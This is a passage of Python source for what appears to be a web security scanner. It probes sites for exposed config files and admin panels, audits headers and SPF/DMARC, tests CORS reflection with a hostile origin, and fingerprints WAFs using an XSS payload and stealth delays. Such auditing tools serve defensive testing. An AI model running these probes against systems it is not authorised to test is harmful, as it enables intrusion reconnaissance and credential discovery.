    ("/database.yml",          "HIGH",     "database.yml exposed — Rails database config may contain credentials"),
    ("/wp-config.php.bak",     "CRITICAL", "WordPress config backup — likely contains DB credentials"),
    ("/config.php.bak",        "CRITICAL", "PHP config backup — likely contains credentials"),
    # PHP info / debug
    ("/phpinfo.php",           "HIGH",     "phpinfo() exposed — reveals PHP config, loaded modules, env vars, and server paths"),
    ("/info.php",              "HIGH",     "phpinfo() exposed — reveals PHP config, loaded modules, env vars, and server paths"),
    ("/test.php",              "MEDIUM",   "test.php accessible — debug/test script left in production"),
    # macOS / editor artifacts — leak directory structure
    ("/.DS_Store",             "MEDIUM",   ".DS_Store exposed — reveals directory file listing from macOS"),
    ("/.idea/workspace.xml",   "MEDIUM",   "JetBrains IDE workspace exposed — reveals project structure and file paths"),
    ("/.vscode/settings.json", "MEDIUM",   "VS Code settings exposed — may reveal project paths and extensions"),
    # CI/CD and secrets
    ("/.travis.yml",           "MEDIUM",   ".travis.yml exposed — reveals CI pipeline and may contain env var names"),
    ("/.circleci/config.yml",  "MEDIUM",   "CircleCI config exposed — reveals CI pipeline structure"),
    ("/.github/workflows",     "MEDIUM",   "GitHub Actions workflows exposed — reveals CI/CD pipeline"),
    ("/Jenkinsfile",            "MEDIUM",   "Jenkinsfile exposed — reveals CI/CD pipeline and may contain credentials"),
    # Logs
    ("/logs/error.log",        "HIGH",     "Error log exposed — may contain stack traces, internal paths, and credentials"),
    ("/error.log",             "HIGH",     "Error log exposed — may contain stack traces, internal paths, and credentials"),
    ("/access.log",            "MEDIUM",   "Access log exposed — reveals traffic patterns and internal endpoints"),
    ("/debug.log",             "HIGH",     "Debug log exposed — may contain sensitive application internals"),
    ("/storage/logs/laravel.log", "HIGH",  "Laravel log exposed — may contain stack traces and request data"),
]

# Body signatures confirming a real file was served (not a catch-all 200 error page)
SENSITIVE_FILE_SIGNATURES = {
    "/package.json":          ['"name"', '"version"', '"dependencies"'],
    "/package-lock.json":     ['"lockfileVersion"', '"node_modules"'],
    "/composer.json":         ['"require"', '"autoload"'],
    "/composer.lock":         ['"packages"', '"content-hash"'],
    "/Dockerfile":            ["FROM ", "RUN ", "COPY ", "EXPOSE "],
    "/docker-compose.yml":    ["services:", "version:", "image:"],
    "/docker-compose.yaml":   ["services:", "version:", "image:"],
    "/.npmrc":                ["registry=", "//registry", "_authToken"],
    "/.htpasswd":             [":$apr1$", ":$2y$", ":{SHA}"],
    "/phpinfo.php":           ["PHP Version", "phpinfo()", "php.ini"],
    "/info.php":              ["PHP Version", "phpinfo()", "php.ini"],
    "/test.php":              ["PHP Version", "phpinfo()", "php.ini", "<?php", "Test Page"],
    "/.DS_Store":             ["\x00\x00\x00\x01Bud1"],   # binary magic
    "/database.yml":          ["adapter:", "database:", "username:", "password:"],
    "/web.config":            ["<configuration>", "connectionStrings", "<system.web>"],
    "/Gemfile":               ["source ", "gem '"],
    "/Jenkinsfile":           ["pipeline {", "stages {", "agent "],
}

_sensitive_checked = set()

def check_sensitive_files(base_url, domain):
    """
    Probe for sensitive files that are commonly committed to source
    control or left accessible by misconfiguration.

    Uses a canary probe to suppress false positives from catch-all 200
    responses (same technique as backup file detection). Where body
    signatures are defined, confirms the file content before alerting.

    Probes run concurrently via a thread pool to avoid serialising on
    slow/hanging servers (e.g. hosts that read-timeout instead of 404ing).
    """
    if domain in _sensitive_checked:
        return
    _sensitive_checked.add(domain)

    # Canary probe — if a random path returns 200, skip (catch-all server)
    canary = base_url.rstrip("/") + f"/nuscrape-canary-{random.randint(100000,999999)}.json"
    try:
        stealth_delay(domain)
        cr = requests.get(canary, headers=create_request_header(),
                          timeout=3, allow_redirects=False)
        if cr and cr.status_code == 200:
            print(timestamp() + f" Sensitive file check skipped (catch-all 200): {domain}")
            return
    except Exception:
        pass

    def _probe(path, severity, description):
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = requests.get(url, headers=create_request_header(),
                                timeout=3, allow_redirects=False)
            if not resp or resp.status_code not in (200, 206):
                return
            body = resp.text
            sigs = SENSITIVE_FILE_SIGNATURES.get(path)
            if sigs and not any(s in body for s in sigs):
                return
            alert("SENSITIVE FILE EXPOSED", severity, url, description)
            print(timestamp() + f" [!!] Sensitive file exposed [{severity}]: {url}")
        except requests.exceptions.Timeout:
            pass
        except Exception as e:
            print_error(f"check_sensitive_files probe failed for {url}: {e}")

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=8) as ex:
        futures = [ex.submit(_probe, path, sev, desc) for path, sev, desc in SENSITIVE_FILES]
        for f in as_completed(futures):
            pass  # errors are handled inside _probe


# ─────────────────────────────────────────────
# Admin panel / API doc / debug console discovery
# ─────────────────────────────────────────────

# (path, severity, description)
# 401/403 → "exists but protected" → reported at one severity step lower
ADMIN_PANEL_PATHS = [
    # Generic admin panels
    ("/admin",                   "HIGH",     "Admin panel returned 200 — may be accessible without authentication"),
    ("/administrator",           "HIGH",     "Administrator panel returned 200"),
    ("/admin/login",             "MEDIUM",   "Admin login page exposed"),
    ("/admin/dashboard",         "HIGH",     "Admin dashboard accessible"),
    ("/manage",                  "HIGH",     "Management panel accessible"),
    ("/management",              "HIGH",     "Management panel accessible"),
    ("/backend",                 "HIGH",     "Backend panel accessible"),
    ("/panel",                   "MEDIUM",   "Panel endpoint accessible"),
    ("/dashboard",               "MEDIUM",   "Dashboard endpoint accessible"),
    ("/cpanel",                  "HIGH",     "cPanel accessible"),
    ("/whm",                     "CRITICAL", "WHM (Web Host Manager) accessible"),
    # CMS-specific
    ("/wp-admin",                "HIGH",     "WordPress admin panel"),
    ("/wp-login.php",            "MEDIUM",   "WordPress login page exposed"),
    ("/xmlrpc.php",              "MEDIUM",   "WordPress XML-RPC enabled — brute force and DDoS amplification risk"),
    ("/typo3",                   "HIGH",     "TYPO3 CMS admin accessible"),
    ("/administrator/index.php", "HIGH",     "Joomla administrator login"),
    ("/concrete/index.php",      "HIGH",     "Concrete5 CMS admin"),
    # Database tools
    ("/phpmyadmin",              "CRITICAL", "phpMyAdmin exposed — direct database access"),
    ("/phpmyadmin/",             "CRITICAL", "phpMyAdmin exposed — direct database access"),
    ("/pma",                     "CRITICAL", "phpMyAdmin (pma) exposed"),
    ("/myadmin",                 "CRITICAL", "phpMyAdmin exposed"),
    ("/adminer",                 "CRITICAL", "Adminer database tool exposed"),
    ("/adminer.php",             "CRITICAL", "Adminer database tool exposed"),
    # Server status / monitoring
    ("/server-status",           "HIGH",     "Apache server-status exposed — active connections, request details, client IPs"),
    ("/server-info",             "HIGH",     "Apache server-info exposed — full server configuration"),
    ("/nginx_status",            "MEDIUM",   "nginx stub_status exposed"),
    # API documentation
    ("/swagger",                 "MEDIUM",   "Swagger UI exposed — API schema enumerable"),
    ("/swagger-ui",              "MEDIUM",   "Swagger UI exposed"),
    ("/swagger-ui.html",         "MEDIUM",   "Swagger UI exposed"),
    ("/swagger-ui/",             "MEDIUM",   "Swagger UI exposed"),
    ("/swagger/index.html",      "MEDIUM",   "Swagger UI exposed"),
    ("/api/swagger",             "MEDIUM",   "API Swagger UI exposed"),
    ("/api/swagger-ui",          "MEDIUM",   "API Swagger UI exposed"),
    ("/api-docs",                "MEDIUM",   "API documentation exposed"),
    ("/api/api-docs",            "MEDIUM",   "API documentation exposed"),
    ("/openapi.json",            "MEDIUM",   "OpenAPI spec exposed — full API schema enumerable"),
    ("/openapi.yaml",            "MEDIUM",   "OpenAPI spec exposed"),
    ("/api/openapi.json",        "MEDIUM",   "OpenAPI spec exposed"),
    ("/v1/api-docs",             "MEDIUM",   "API v1 documentation exposed"),
    ("/v2/api-docs",             "MEDIUM",   "API v2 documentation exposed"),
    ("/v3/api-docs",             "MEDIUM",   "API v3 documentation exposed"),
    ("/redoc",                   "MEDIUM",   "ReDoc API documentation exposed"),
    ("/api/docs",                "MEDIUM",   "API documentation accessible"),
    # Debug consoles
    ("/console",                 "CRITICAL", "Interactive console/REPL endpoint accessible — possible RCE"),
    ("/_debugbar",               "HIGH",     "Laravel DebugBar exposed — reveals request internals, queries, and config"),
    ("/telescope",               "HIGH",     "Laravel Telescope exposed — full application introspection"),
    ("/horizon",                 "HIGH",     "Laravel Horizon exposed — queue management interface"),
    ("/_profiler",               "HIGH",     "Symfony Profiler exposed — reveals request internals and route list"),
    ("/rails/info/properties",   "HIGH",     "Rails info/properties exposed — reveals app config and routes"),
    ("/rails/info/routes",       "HIGH",     "Rails route list exposed"),
]

# Body signatures that confirm a real admin/tool page vs a catch-all 200.
# Keys are path substrings — first match wins.
ADMIN_PANEL_SIGNATURES = {
    "phpmyadmin":           ["phpMyAdmin", "pma_username", "phpmyadmin"],
    "pma":                  ["phpMyAdmin", "pma_username"],
    "myadmin":              ["phpMyAdmin", "pma_username"],
    "adminer":              ["Adminer", "adminer", "db_driver", "login-form"],
    "wp-admin":             ["WordPress", "wp-login", "wp-admin"],
    "wp-login.php":         ["WordPress", "user_login", "log", "pwd"],
    "xmlrpc.php":           ["XML-RPC server", "xmlrpc"],
    "server-status":        ["Server Version:", "requests currently being processed", "Apache Server Status"],
    "server-info":          ["Apache Server Information", "Module Name", "mod_"],
    "nginx_status":         ["Active connections:", "server accepts handled"],
    "swagger":              ["swagger", "Swagger UI", "SwaggerUIBundle", "api-docs"],
    "openapi.json":         ['"openapi"', '"swagger"', '"paths"'],
    "openapi.yaml":         ["openapi:", "swagger:", "paths:"],
    "redoc":                ["ReDoc", "redoc", "api-docs"],
    "_debugbar":            ["debugbar", "DebugBar", "phpdebugbar"],
    "telescope":            ["telescope", "Telescope", "laravel-telescope"],
    "horizon":              ["horizon", "Horizon", "laravel-horizon"],
    "_profiler":            ["Symfony Profiler", "sf-profiler", "wdt-content"],
    "console":              ["console", "REPL", "Interactive Console", "Werkzeug Debugger", "werkzeug"],
    "rails/info":           ["Rails", "Controller", "ruby"],
    "cpanel":               ["cPanel", "Web Hosting Control Panel"],
    "whm":                  ["WHM", "Web Host Manager"],
}

def _admin_body_sigs(path):
    """Return signature list for path, or None if no confirmation needed."""
    for key, sigs in ADMIN_PANEL_SIGNATURES.items():
        if key in path:
            return sigs
    return None

_admin_checked = set()

def check_admin_panels(base_url, domain):
    """
    Probe for exposed admin panels, database tools, API documentation,
    server status pages, and debug consoles.

    Strategy:
    - Canary probe first to detect catch-all 200 servers (skip if triggered).
    - 200 responses: confirm with body signatures where available, then alert.
    - 401/403 responses: resource confirmed to exist (auth wall) — alert MEDIUM/LOW.
    - All probes run concurrently via ThreadPoolExecutor.
    """
    if domain in _admin_checked:
        return
    _admin_checked.add(domain)

    # Canary — if a random nonexistent path returns 200 we can't trust 200s
    canary = base_url.rstrip("/") + f"/nuscrape-canary-{random.randint(100000,999999)}.admin"
    catch_all_200 = False
    try:
        cr = requests.get(canary, headers=create_request_header(),
                          timeout=4, allow_redirects=False)
        if cr and cr.status_code == 200:
            catch_all_200 = True
            print(timestamp() + f" Admin panel check: catch-all 200 on {domain} — 200 responses will be skipped")
    except Exception:
        pass

    def _probe(path, severity, description):
        url = base_url.rstrip("/") + path
        try:
            stealth_delay(domain)
            resp = requests.get(url, headers=create_request_header(),
                                timeout=4, allow_redirects=False)
            if not resp:
                return
            status = resp.status_code

            if status in (200, 206):
                if catch_all_200:
                    return  # Can't trust 200 on this server
                body = resp.text
                sigs = _admin_body_sigs(path)
                if sigs and not any(s.lower() in body.lower() for s in sigs):
                    return  # 200 but body doesn't match — likely catch-all or unrelated page
                alert(f"ADMIN PANEL EXPOSED", severity, url,
                      description + f" (HTTP {status})")
                print(timestamp() + f" [!!] Admin panel [{severity}]: {url}")

            elif status in (401, 403):
                # Resource exists behind auth — lower severity than open access
                sev_map = {"CRITICAL": "HIGH", "HIGH": "MEDIUM", "MEDIUM": "LOW", "LOW": "LOW"}
                reduced = sev_map.get(severity, "LOW")
                alert("ADMIN PANEL FOUND (AUTH REQUIRED)", reduced, url,
                      description.split(" —")[0] + f" — protected (HTTP {status}), verify auth bypass")
                print(timestamp() + f"  Admin panel (auth) [{reduced}]: {url} ({status})")

        except requests.exceptions.Timeout:
            pass  # server hung — expected for scanner probes, not an error
        except Exception as e:
            print_error(f"check_admin_panels probe failed for {url}: {e}")

    from concurrent.futures import ThreadPoolExecutor, as_completed
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = [ex.submit(_probe, path, sev, desc) for path, sev, desc in ADMIN_PANEL_PATHS]
        for f in as_completed(futures):
            pass


# ─────────────────────────────────────────────
# Security headers audit
# ─────────────────────────────────────────────

# (header_name_lowercase, severity, finding_name, detail)
_SEC_HEADERS_REQUIRED = [
    (
        "strict-transport-security",
        "MEDIUM",
        "MISSING HSTS",
        "Strict-Transport-Security absent — HTTPS not enforced, connection may be downgraded to HTTP",
    ),
    (
        "content-security-policy",
        "MEDIUM",
        "MISSING CSP",
        "Content-Security-Policy absent — no XSS mitigation policy in place",
    ),
    (
        "x-frame-options",
        "MEDIUM",
        "MISSING X-FRAME-OPTIONS",
        "X-Frame-Options absent (and no CSP frame-ancestors) — site may be embeddable; clickjacking risk",
    ),
    (
        "x-content-type-options",
        "LOW",
        "MISSING X-CONTENT-TYPE-OPTIONS",
        "X-Content-Type-Options: nosniff absent — browser may MIME-sniff responses and execute mistyped scripts",
    ),
    (
        "referrer-policy",
        "LOW",
        "MISSING REFERRER-POLICY",
        "Referrer-Policy absent — full URL including query string sent to third-party origins via Referer header",
    ),
    (
        "permissions-policy",
        "LOW",
        "MISSING PERMISSIONS-POLICY",
        "Permissions-Policy absent — browser capabilities (camera, mic, geolocation) not explicitly restricted",
    ),
]

# Headers that disclose server internals — flagged when present, not when absent
# (header_name_lowercase, version_pattern, severity, detail_template)
_SEC_HEADERS_REVEALING = [
    (
        "server",
        re.compile(r"(?:Apache|nginx|IIS|lighttpd|openresty|litespeed|gunicorn|tornado|jetty|tomcat|jboss|websphere|weblogic)/[\d.]+", re.I),
        "LOW",
        "Server header discloses version: {value}",
    ),
    (
        "x-powered-by",
        re.compile(r".+"),
        "LOW",
        "X-Powered-By header reveals technology stack: {value}",
    ),
    (
        "x-aspnet-version",
        re.compile(r".+"),
        "LOW",
        "X-AspNet-Version reveals .NET runtime version: {value}",
    ),
    (
        "x-aspnetmvc-version",
        re.compile(r".+"),
        "LOW",
        "X-AspNetMvc-Version reveals ASP.NET MVC version: {value}",
    ),
]

_sec_headers_checked = set()

def check_security_headers(base_url, domain):
    """
    Audit HTTP security headers on the base URL.

    Checks for:
    - Missing defensive headers: HSTS, CSP, X-Frame-Options, X-Content-Type-Options,
      Referrer-Policy, Permissions-Policy
    - Revealing headers that disclose server/framework versions: Server, X-Powered-By,
      X-AspNet-Version, X-AspNetMvc-Version

    HSTS is only flagged on HTTPS sites — it has no effect over plain HTTP.
    X-Frame-Options is only flagged if CSP does not include a frame-ancestors directive,
    since frame-ancestors supersedes X-Frame-Options per spec.
    """
    if domain in _sec_headers_checked:
        return
    _sec_headers_checked.add(domain)

    try:
        resp = safe_get(base_url, timeout=8)
        if not resp:
            return
        hdrs = {k.lower(): v for k, v in resp.headers.items()}
        is_https = base_url.startswith("https://")

        for hdr_name, severity, finding, detail in _SEC_HEADERS_REQUIRED:
            # HSTS only meaningful over HTTPS
            if hdr_name == "strict-transport-security" and not is_https:
                continue

            # X-Frame-Options: skip if CSP already has frame-ancestors (it supersedes XFO)
            if hdr_name == "x-frame-options":
                csp = hdrs.get("content-security-policy", "")
                if "frame-ancestors" in csp.lower():
                    continue

            if hdr_name not in hdrs:
                alert(finding, severity, base_url, detail)
                print(timestamp() + f"  Security header [{severity}] missing on {domain}: {hdr_name}")

        # Check for revealing headers
        for hdr_name, pattern, severity, detail_tmpl in _SEC_HEADERS_REVEALING:
            value = hdrs.get(hdr_name, "")
            if value and pattern.search(value):
                detail = detail_tmpl.format(value=value)
                alert("INFORMATION DISCLOSURE — HEADER", severity, base_url, detail)
                print(timestamp() + f"  Revealing header [{severity}] on {domain}: {hdr_name}: {value}")

    except Exception as e:
        print_error(f"check_security_headers failed for {domain}: {e}")


def count_spf_lookups(domain, depth=0, visited=None):
    """
    Recursively count DNS-querying mechanisms in an SPF record.

    Mechanisms that consume a lookup (RFC 7208 §4.6.4):
      include:, a, mx, ptr, exists:, redirect=
    Mechanisms that do NOT count: ip4:, ip6:, all, exp=, v=spf1

    Caps recursion at depth 15 and tracks visited domains to prevent cycles.
    Returns the total integer count of DNS lookups required to evaluate the record.
    """
    if visited is None:
        visited = set()
    if depth > 15 or domain in visited:
        return 0
    visited.add(domain)

    try:
        txt_records = dns.resolver.resolve(domain, 'TXT')
        spf = None
        for r in txt_records:
            val = r.to_text().strip('"')
            if val.startswith('v=spf1'):
                spf = val
                break
        if not spf:
            return 0
    except Exception:
        return 0

    count = 0
    for term in spf.split():
        term_lc = term.lower().lstrip('+-?~')
        if term_lc.startswith('include:'):
            count += 1
            count += count_spf_lookups(term[term.index(':') + 1:], depth + 1, visited)
        elif term_lc.startswith('redirect='):
            count += 1
            count += count_spf_lookups(term[term.index('=') + 1:], depth + 1, visited)
        elif (term_lc in ('a', 'mx', 'ptr') or
              term_lc.startswith(('a:', 'mx:', 'ptr:', 'exists:'))):
            count += 1
    return count


def check_spf_dmarc(domain):
    """
    Query DNS TXT records to check SPF and DMARC configuration.

    Reportable findings:
      - Missing SPF entirely     → anyone can spoof @domain email
      - SPF with +all            → explicitly allows any server to send
      - SPF with ?all            → neutral/permissive, weak protection
      - SPF with ~all            → softfail, not a hard reject
      - SPF lookup count > 10   → permerror at receiving MTAs (RFC 7208)
      - Missing DMARC            → no policy enforcement even if SPF/DKIM fail
      - DMARC with p=none        → monitoring only, no rejection/quarantine
      - DMARC missing rua=       → no aggregate reports, org is blind to spoofing
      - DMARC pct < 100          → policy not applied to all mail
      - DMARC p=quarantine + no rua= → quarantining but not monitoring
    """
    root = extract_root_domain(domain)

    # Only check once per root domain
    if not hasattr(check_spf_dmarc, "_checked"):
        check_spf_dmarc._checked = set()
    if root in check_spf_dmarc._checked:
        return
    check_spf_dmarc._checked.add(root)

    # ── SPF ──────────────────────────────────────────────────
    try:
        txt_records = dns.resolver.resolve(root, 'TXT')
        spf_record = None
        for record in txt_records:
            val = record.to_text().strip('"')
            if val.startswith("v=spf1"):
                spf_record = val
                break

        if spf_record is None:
            alert(
                "MISSING SPF RECORD",
                "HIGH",
                root,
                f"No SPF TXT record found for {root} — anyone can spoof email from this domain"
            )
            print(timestamp() + " [!] No SPF record for " + root)
        elif "+all" in spf_record:
            alert(
                "SPF MISCONFIGURATION: +all",
                "CRITICAL",
                root,
                f"SPF record uses +all — explicitly permits any server to send as {root}: {spf_record}"
            )
            print(timestamp() + " [!!] SPF +all on " + root)
        elif "?all" in spf_record:
            alert(
                "SPF MISCONFIGURATION: ?all",
                "MEDIUM",
                root,
                f"SPF record uses ?all (neutral) — weak protection against spoofing: {spf_record}"
            )
            print(timestamp() + " [!] SPF ?all on " + root)
        elif "~all" in spf_record:
            alert(
                "SPF SOFTFAIL: ~all",
                "LOW",
                root,
                f"SPF record uses ~all (softfail) — failing messages are accepted and tagged "
                f"rather than rejected; upgrade to -all for hard enforcement: {spf_record}"
            )
            print(timestamp() + " [!] SPF ~all (softfail) on " + root)
        else:
            print(timestamp() + " SPF OK for " + root + ": " + spf_record[:80])

        # Recursive lookup count — RFC 7208 §4.6.4 limits evaluation to 10 DNS queries.
        # Exceeding this causes a permerror at receiving MTAs, which most treat as fail.
        if spf_record is not None:
            try:
                lookup_count = count_spf_lookups(root)
                if lookup_count > 10:
                    alert(
                        "SPF LOOKUP LIMIT EXCEEDED",
                        "MEDIUM",
                        root,
                        f"SPF record for {root} requires {lookup_count} DNS lookups "
                        f"(RFC 7208 limit is 10) — receiving MTAs will return permerror, "
                        f"causing legitimate mail to fail authentication"
                    )
                    print(timestamp() + f" [!] SPF lookup limit exceeded on {root}: {lookup_count} lookups")
            except Exception as _e:
                print_error(f"count_spf_lookups failed for {root}: {_e}")

    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers):
        alert(
            "MISSING SPF RECORD",
            "HIGH",
            root,
            f"No TXT records found for {root} — SPF absent, email spoofing possible"
        )

    # ── DMARC ────────────────────────────────────────────────
    try:
        dmarc_domain = "_dmarc." + root
        dmarc_records = dns.resolver.resolve(dmarc_domain, 'TXT')
        dmarc_record = None
        for record in dmarc_records:
            val = record.to_text().strip('"')
            if val.startswith("v=DMARC1"):
                dmarc_record = val
                break

        if dmarc_record is None:
            alert(
                "MISSING DMARC RECORD",
                "HIGH",
                root,
                f"No DMARC record at _dmarc.{root} — no enforcement policy, SPF/DKIM failures are not acted on"
            )
            print(timestamp() + " [!] No DMARC record for " + root)
        else:
            # Parse the policy value
            policy = None
            for part in dmarc_record.split(";"):
                part = part.strip()
                if part.startswith("p="):
                    policy = part[2:].strip().lower()
                    break

            # Parse all tags into a dict for the extended checks below
            dmarc_tags = {}
            for part in dmarc_record.split(";"):
                part = part.strip()
                if "=" in part:
                    k, _, v = part.partition("=")
                    dmarc_tags[k.strip().lower()] = v.strip()

            has_rua = "rua" in dmarc_tags and dmarc_tags["rua"]

            if policy == "none":
                alert(
                    "DMARC POLICY: p=none (monitor only)",
                    "MEDIUM",
                    root,
                    f"DMARC exists but p=none — emails that fail SPF/DKIM are NOT rejected or quarantined: {dmarc_record}"
                )
                print(timestamp() + " [!] DMARC p=none on " + root)
            else:
                print(timestamp() + " DMARC OK for " + root + " (p=" + str(policy) + ")")

            # rua= check — missing means org receives no aggregate failure reports
            if not has_rua:
                if policy == "quarantine":
                    alert(
                        "DMARC NO REPORTING: p=quarantine, rua= absent",
                        "LOW",
                        root,
                        f"DMARC quarantines failing mail but has no rua= tag — "
                        f"spoofing attempts are silently quarantined with no visibility: {dmarc_record}"
                    )
                    print(timestamp() + " [!] DMARC p=quarantine, no rua= on " + root)
                elif policy != "none":
                    # p=none already alerted above; p=reject or unknown without rua= is MEDIUM
                    alert(
                        "DMARC NO AGGREGATE REPORTING",
                        "MEDIUM",
                        root,
                        f"DMARC record has no rua= tag — no aggregate reports will be sent, "
                        f"organisation is blind to spoofing attempts against {root}: {dmarc_record}"
                    )
                    print(timestamp() + " [!] DMARC missing rua= on " + root)

            # pct= check — partial policy application
            if "pct" in dmarc_tags:
                try:
                    pct = int(dmarc_tags["pct"])
                    if pct < 100:
                        alert(
                            "DMARC PARTIAL POLICY: pct<100",
                            "LOW",
                            root,
                            f"DMARC pct={pct} — policy is only applied to {pct}% of failing messages; "
                            f"remaining {100 - pct}% are delivered without enforcement: {dmarc_record}"
                        )
                        print(timestamp() + f" [!] DMARC pct={pct} (partial) on {root}")
                except ValueError:
                    pass

    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
            dns.exception.Timeout, dns.resolver.NoNameservers):
        alert(
            "MISSING DMARC RECORD",
            "HIGH",
            root,
            f"No DMARC record found for _dmarc.{root} — no enforcement policy"
        )
        print(timestamp() + " [!] No DMARC record for " + root)

def check_cors_misconfiguration(base_url, domain):
    """
    Send a request with a hostile Origin header and check if the server
    reflects it back in Access-Control-Allow-Origin.

    The dangerous combination is:
      Access-Control-Allow-Origin: <reflected evil origin>
      Access-Control-Allow-Credentials: true

    Either alone is lower severity — together they allow cross-origin
    requests with cookies, enabling account takeover from an attacker page.
    """
    try:
        evil_origin = "https://evil-cors-probe.com"
        stealth_delay(domain)
        headers = {**create_request_header(), "Origin": evil_origin}
        resp = requests.get(base_url, headers=headers, timeout=8, allow_redirects=True)
        if not resp:
            return

        acao  = resp.headers.get("Access-Control-Allow-Origin", "")
        acac  = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
        acam  = resp.headers.get("Access-Control-Allow-Methods", "")

        reflects_origin    = acao == evil_origin
        wildcard           = acao == "*"
        allows_credentials = acac == "true"

        if reflects_origin and allows_credentials:
            # Most severe — cross-origin requests with cookies allowed
            alert(
                "CORS MISCONFIGURATION: ORIGIN REFLECTION + CREDENTIALS",
                "CRITICAL",
                domain,
                f"Server reflects arbitrary Origin and sets Allow-Credentials: true — cross-origin requests with cookies are permitted. ACAO: {acao}"
            )
            print(timestamp() + " [!!] Critical CORS misconfiguration on " + domain)

        elif reflects_origin:
            # Reflects origin but no credentials — still reportable
            alert(
                "CORS MISCONFIGURATION: ORIGIN REFLECTION",
                "HIGH",
                domain,
                f"Server reflects arbitrary Origin header. ACAO: {acao}, Methods: {acam or 'not specified'}"
            )
            print(timestamp() + " [!] CORS reflects origin on " + domain)

        elif wildcard and allows_credentials:
            # Wildcard + credentials is technically invalid per spec but
            # some frameworks implement it anyway
            alert(
                "CORS MISCONFIGURATION: WILDCARD + CREDENTIALS",
                "HIGH",
                domain,
                f"Access-Control-Allow-Origin: * combined with Allow-Credentials: true — non-standard but potentially exploitable"
            )
            print(timestamp() + " [!] CORS wildcard+credentials on " + domain)

    except Exception as e:
        print_error("check_cors_misconfiguration failed for " + domain + ": " + str(e))

# ─────────────────────────────────────────────
# WAF / security appliance fingerprinting
# ─────────────────────────────────────────────

_waf_checked = set()

# Signature sets: headers, cookie name prefixes, server header fragments, body snippets
WAF_SIGNATURES = {
    "Cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
        "cookies": [],
        "server":  ["cloudflare"],
        "body":    ["Attention Required! | Cloudflare", "cf-error-details"],
    },
    "Akamai": {
        "headers": ["x-check-cacheable", "x-akamai-transformed", "x-akamai-request-id"],
        "cookies": [],
        "server":  ["akamaighost", "akamai"],
        "body":    ["Reference&#32;&#35;", "Reference #", "Akamai"],
    },
    "Imperva Incapsula": {
        "headers": ["x-iinfo"],
        "cookies": ["visid_incap_", "incap_ses_"],
        "server":  ["incapsula"],
        "body":    ["Incapsula incident", "_Incapsula_Resource_"],
    },
    "AWS WAF": {
        "headers": ["x-amzn-requestid"],
        "cookies": ["awsalb", "awsalbcors"],
        "server":  [],
        "body":    ["AWS WAF", "Request blocked"],
    },
    "Sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "cookies": [],
        "server":  ["sucuri/cloudproxy", "sucuri"],
        "body":    ["Sucuri WebSite Firewall", "sucuri-nginxproxy"],
    },
    "F5 BIG-IP ASM": {
        "headers": ["x-wa-info"],
        "cookies": ["ts", "f5_cspm", "f5avr", "bigipserver"],
        "server":  ["bigip", "big-ip", "f5 big-ip"],
        "body":    ["The requested URL was rejected", "Please consult with your administrator"],
    },
    "Barracuda": {
        "headers": [],
        "cookies": ["barra_counter_session"],
        "server":  [],
        "body":    ["You have been blocked", "Barracuda Networks"],
    },
    "Wordfence": {
        "headers": [],
        "cookies": [],
        "server":  [],
        "body":    ["generated by Wordfence", "wordfence.com/"],
    },
    "ModSecurity": {
        "headers": ["x-mod-security-message"],
        "cookies": [],
        "server":  [],
        "body":    ["ModSecurity", "mod_security", "This error was generated by Mod_Security"],
    },
    "Fortinet FortiWeb": {
        "headers": [],
        "cookies": ["FORTIWAFSID"],
        "server":  ["fortiweb"],
        "body":    ["FortiWeb", "FortiGate"],
    },
    "Reblaze": {
        "headers": ["x-reblaze-protection"],
        "cookies": ["rbzid"],
        "server":  [],
        "body":    [],
    },
}

def detect_waf(base_url, domain):
    """
    Passive + light-active WAF fingerprinting.

    Pass 1 (passive): inspect headers and cookies from the normal homepage
    response for known WAF signatures.

    Pass 2 (active): send a request with an obviously malicious payload
    (classic XSS string) and inspect the response. WAFs typically return
    403/406/429/503 with a distinctive error page. Compare headers/body
    against signatures.

    Findings are stored in the WAF table and printed as informational context.
    No alert is raised — WAF presence is not a vulnerability, but it's
    critical intelligence for a red teamer (determines viable techniques).
    """
    if domain in _waf_checked:
        return
    _waf_checked.add(domain)

    detected = {}   # vendor → list of evidence strings

    def _check_response(resp, label):
        if not resp:
            return
        header_keys = {k.lower() for k in resp.headers}
        header_vals = " ".join(resp.headers.values()).lower()
        body_snip   = resp.text[:3000].lower() if resp.text else ""
        cookies_str = " ".join(
            c.lower() for c in resp.headers.get("Set-Cookie", "").split(";")
        )
        server = resp.headers.get("Server", "").lower()

        for vendor, sigs in WAF_SIGNATURES.items():
            evidence = []
            for h in sigs["headers"]:
                if h in header_keys:
                    evidence.append(f"header:{h}")
            for c in sigs["cookies"]:
                if c in cookies_str:
                    evidence.append(f"cookie:{c}")
            for s in sigs["server"]:
                if s in server:
                    evidence.append(f"server:{s}")
            for b in sigs["body"]:
                if b.lower() in body_snip:
                    evidence.append(f"body-match")
            if evidence:
                if vendor not in detected:
                    detected[vendor] = []
                detected[vendor].extend([f"{label}:{e}" for e in evidence])

    try:
        # Pass 1 — normal request
        r1 = safe_get(base_url, timeout=8)
        _check_response(r1, "normal")

        # Pass 2 — WAF-triggering request (XSS payload in a query param)
        probe_url = base_url.rstrip("/") + "/?waf_probe=<script>alert(1)</script>"
        r2 = requests.get(probe_url, headers=create_request_header(),
                          timeout=6, allow_redirects=True)
        _check_response(r2, "probe")

    except Exception as e:
        print_error(f"WAF detection failed for {domain}: {e}")
        return

    if detected:
        for vendor, evidence in detected.items():
            ev_str = ", ".join(dict.fromkeys(evidence))  # dedup, preserve order
            print(timestamp() + f" WAF detected on {domain}: {vendor} ({ev_str})")
            write_to_waf_database(domain, vendor, ev_str)
    else:
        print(timestamp() + f" No WAF detected on {domain}")

def _is_akamai_block(resp):
    """
    Return True if the response is an Akamai edge block rather than a real
    application response. Findings against Akamai-blocked responses are
    suppressed to avoid false positives.
    """
    if resp is None:
        return False
    for v in resp.headers.values():
        if "edgesuite.net" in v.lower():
            return True
    if resp.text and "edgesuite.net" in resp.text.lower():
        return True
    return False

def write_to_waf_database(domain, waf_vendor, detected_by):
    conn = sqlite3.connect("ScrapeDB", isolation_level=None)
    try:
